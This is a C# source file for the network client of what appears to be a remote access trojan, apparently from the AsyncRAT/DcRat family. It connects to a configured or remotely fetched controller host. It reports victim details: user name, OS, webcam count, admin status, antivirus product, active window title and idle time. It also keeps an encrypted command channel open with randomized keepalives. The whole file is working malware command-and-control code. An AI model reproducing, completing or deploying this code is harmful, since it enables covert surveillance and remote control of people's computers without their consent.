using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using AForge.Video.DirectShow;
using Client.HandlePacket;
using MessagePack;
using Microsoft.VisualBasic.Devices;
using Timer = System.Threading.Timer;

namespace Client
{
    public class TCPSocket
    {
        public Socket Client { get; set; }
        private byte[] Buffer { get; set; }
        private long Buffersize { get; set; }
        private MemoryStream MS { get; set; }
        public bool IsConnected { get; set; }
        private object SendSync { get; } = new object();
        private Timer KeepAlive { get; set; }

        public void InitializeClient() //Connect & reconnect
        {
            try
            {
                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024
                };

                if (string.IsNullOrEmpty(Program.Link))
                {
                    if (IsValidDomainName(Program.Host))
                    {
                        var addresslist = Dns.GetHostAddresses(Program.Host);

                        foreach (var theaddress in addresslist)
                            try
                            {
                                Client.Connect(theaddress, Program.Port);
                                if (Client.Connected) break;
                            }
                            catch (Exception ex)
                            {
                                //Debug.WriteLine(ex.Message);
                            }
                    }
                    else
                    {
                        Client.Connect(Program.Host, Program.Port);
                    }
                }
                else
                {
                    using (var wc = new WebClient())
                    {
                        var networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        var resp = wc.DownloadString(Program.Link);
                        var spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                        Client.Connect(spl[0], Convert.ToInt32(spl[new Random().Next(1, spl.Length)]));
                    }
                }

                if (Client.Connected)
                {
                    IsConnected = true;
                    Buffer = new byte[4];
                    MS = new MemoryStream();
                    Send(SendInfo());
                    KeepAlive = new Timer(KeepAlivePacket, null,
                        new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch (Exception ex)
            {
                //Debug.WriteLine(ex.Message);
                IsConnected = false;
            }
        }

        public static byte[] SendInfo()
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = Program.HWID;
            msgpack.ForcePathObject("User").AsString = Environment.UserName;
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " + (Helper.Helper.Is64Bit() ? "64bit" : "32bit");
            msgpack.ForcePathObject("Camera").AsString = new FilterInfoCollection(FilterCategory.VideoInputDevice).Count.ToString();
            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
            msgpack.ForcePathObject("Version").AsString = Program.Version;
            msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? "Admin" : "User";
            msgpack.ForcePathObject("Active").AsString = Helper.Helper.GetActiveWindowTitle();
            msgpack.ForcePathObject("AV").AsString = Helper.Helper.GetAV();
            msgpack.ForcePathObject("Install-Time").AsString = new FileInfo(Process.GetCurrentProcess().MainModule.FileName.Trim().Replace("\"", "")).LastWriteTime.ToUniversalTime().ToString();
            msgpack.ForcePathObject("Group").AsString = Program.Group;
            msgpack.ForcePathObject("ClrVersion").AsInteger = Program.ClrVersion;
            return msgpack.Encode2Bytes();
        }

        public static bool IsValidDomainName(string name)
        {
            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
        }

        public void Reconnect()
        {
            try
            {
                KeepAlive?.Dispose();
                if (Client != null) Client.Close();
                MS?.Dispose();
            }
            finally
            {
                InitializeClient();
            }
        }

        public void CloseConnection()
        {
            try
            {
                KeepAlive?.Dispose();
                if (Client != null) Client.Close();
                MS?.Dispose();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        public void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (!Client.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }

                var recevied = Client.EndReceive(ar);
                if (recevied == 4)
                {
                    MS.Write(Buffer, 0, recevied);
                    Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                    MS.Dispose();
                    MS = new MemoryStream();
                    if (Buffersize > 0)
                    {
                        Buffer = new byte[Buffersize];
                        while (MS.Length != Buffersize)
                        {
                            var rc = Client.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
                            if (rc == 0)
                            {
                                IsConnected = false;
                                return;
                            }

                            MS.Write(Buffer, 0, rc);
                            Buffer = new byte[Buffersize - MS.Length];
                        }

                        if (MS.Length == Buffersize)
                        {
                            ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
                            Buffer = new byte[4];
                            MS.Dispose();
                            MS = new MemoryStream();
                        }
                        else
                        {
                            Buffer = new byte[Buffersize - MS.Length];
                        }
                    }

                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                IsConnected = false;
            }
        }

        public void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!Client.Connected)
                    {
                        IsConnected = false;
                        return;
                    }

                    if (msg == null) return;

                    var buffer = Helper.Helper.Aes.Encrypt(msg);
                    var buffersize = BitConverter.GetBytes(buffer.Length);

                    Client.Poll(-1, SelectMode.SelectWrite);
                    Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
                    //Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                    int chunkSize = 50 * 1024;
                    byte[] chunk = new byte[chunkSize];
                    using (MemoryStream buffereReader = new MemoryStream(buffer))
                    {
                        BinaryReader binaryReader = new BinaryReader(buffereReader);
                        int bytesToRead = (int)buffereReader.Length;
                        do
                        {
                            chunk = binaryReader.ReadBytes(chunkSize);
                            bytesToRead -= chunkSize;

                            Client.Send(chunk, 0, chunk.Length, SocketFlags.None);
                        } while (bytesToRead > 0);

                        binaryReader.Close();
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                    IsConnected = false;
                }
            }
        }

        public void KeepAlivePacket(object obj)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientPing";
            msgpack.ForcePathObject("HWID").AsString = Program.HWID;
            msgpack.ForcePathObject("Message").AsString = Helper.Helper.GetActiveWindowTitle();
            msgpack.ForcePathObject("Roundtrip").AsString = pingRoundtrip().ToString();
            msgpack.ForcePathObject("LastInput").AsString = GetLastInputTime().ToString();
            Send(msgpack.Encode2Bytes());
            GC.Collect();
        }

        public static long pingRoundtrip()
        {
            try
            {
                Ping pingSender = new Ping();
                string data = "Creeper_Awww_Man";
                byte[] buffer = Encoding.UTF8.GetBytes(data);
                int timeout = 1000;
                PingOptions options = new PingOptions(64, true);
                return pingSender.Send(Program.Host, timeout, buffer, options).RoundtripTime;
            }
            catch
            {
                return 0;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LASTINPUTINFO
        {
            [MarshalAs(UnmanagedType.U4)]
            public int cbSize;
            [MarshalAs(UnmanagedType.U4)]
            public uint dwTime;
        }
        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
        private static long GetLastInputTime()
        {
            LASTINPUTINFO vLastInputInfo = new LASTINPUTINFO();
            vLastInputInfo.cbSize = Marshal.SizeOf(vLastInputInfo);
            if (!GetLastInputInfo(ref vLastInputInfo))
                return 0;
            else
                return Environment.TickCount - (long)vLastInputInfo.dwTime;
        }

        public void Log(string message)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Log";
            msgpack.ForcePathObject("Message").AsString = message;
            Send(msgpack.Encode2Bytes());
            GC.Collect();
        }
    }
}